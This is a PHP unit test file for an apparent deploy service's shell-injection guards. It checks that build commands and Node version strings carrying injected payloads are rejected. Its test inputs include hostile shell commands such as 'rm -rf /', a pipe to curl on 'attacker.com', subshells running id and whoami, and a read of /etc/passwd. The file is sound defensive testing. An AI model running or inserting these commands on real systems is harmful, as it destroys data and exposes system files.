<?php

namespace Tests\Unit;

use App\Services\DeployService;
use Tests\TestCase;

/**
 * Verify that the shell-injection guards in DeployService reject
 * dangerous build commands and Node.js version specifiers before
 * they are passed to `bash -c`.
 *
 * Both methods are private; tests invoke them via reflection.
 */
class DeployServiceCommandInjectionTest extends TestCase
{
    private \ReflectionClass $reflection;

    private DeployService $service;

    protected function setUp(): void
    {
        parent::setUp();
        $this->service = app(DeployService::class);
        $this->reflection = new \ReflectionClass($this->service);
    }

    private function call(string $method, mixed ...$args): mixed
    {
        $m = $this->reflection->getMethod($method);
        $m->setAccessible(true);

        return $m->invoke($this->service, ...$args);
    }

    // ── validateBuildCommand ───────────────────────────────────────────────

    /** @test */
    public function test_build_command_with_semicolon_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateBuildCommand', 'npm run build; rm -rf /');
    }

    /** @test */
    public function test_build_command_with_pipe_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateBuildCommand', 'npm run build | curl http://attacker.com');
    }

    /** @test */
    public function test_build_command_with_backtick_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateBuildCommand', 'npm run build `id`');
    }

    /** @test */
    public function test_build_command_with_dollar_subshell_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateBuildCommand', 'npm run build $(whoami)');
    }

    /** @test */
    public function test_build_command_with_input_redirect_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateBuildCommand', 'npm run build < /etc/passwd');
    }

    /** @test */
    public function test_build_command_with_output_redirect_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateBuildCommand', 'npm run build > /tmp/out');
    }

    /** @test */
    public function test_build_command_with_newline_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateBuildCommand', "npm run build\nrm -rf /");
    }

    /** @test */
    public function test_build_command_double_ampersand_is_allowed(): void
    {
        // && is explicitly permitted (common pattern: "npm install && npm run build")
        $this->call('validateBuildCommand', 'npm install && npm run build');
        $this->assertTrue(true); // reached = no exception
    }

    /** @test */
    public function test_valid_build_commands_are_accepted(): void
    {
        $this->call('validateBuildCommand', 'npm run build');
        $this->call('validateBuildCommand', 'yarn build');
        $this->call('validateBuildCommand', 'pnpm install && pnpm build');
        $this->call('validateBuildCommand', 'hugo --minify');
        $this->assertTrue(true);
    }

    // ── validateNodeVersion ───────────────────────────────────────────────

    /** @test */
    public function test_node_version_with_semicolon_injection_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateNodeVersion', '18; rm -rf /');
    }

    /** @test */
    public function test_node_version_with_space_injection_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateNodeVersion', '18 && whoami');
    }

    /** @test */
    public function test_node_version_with_backtick_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->call('validateNodeVersion', '`id`');
    }

    /** @test */
    public function test_node_version_major_only_is_accepted(): void
    {
        $this->call('validateNodeVersion', '20');
        $this->call('validateNodeVersion', '18');
        $this->assertTrue(true);
    }

    /** @test */
    public function test_node_version_semver_is_accepted(): void
    {
        $this->call('validateNodeVersion', '18.12.1');
        $this->call('validateNodeVersion', '20.0.0');
        $this->assertTrue(true);
    }

    /** @test */
    public function test_node_version_lts_alias_is_accepted(): void
    {
        $this->call('validateNodeVersion', 'lts/iron');
        $this->call('validateNodeVersion', 'lts/hydrogen');
        $this->assertTrue(true);
    }

    /** @test */
    public function test_node_version_named_alias_is_accepted(): void
    {
        $this->call('validateNodeVersion', 'current');
        $this->call('validateNodeVersion', 'stable');
        $this->assertTrue(true);
    }

    /** @test */
    public function test_empty_node_version_is_accepted(): void
    {
        // Empty string is treated as "use default" — no exception
        $this->call('validateNodeVersion', '');
        $this->assertTrue(true);
    }
}
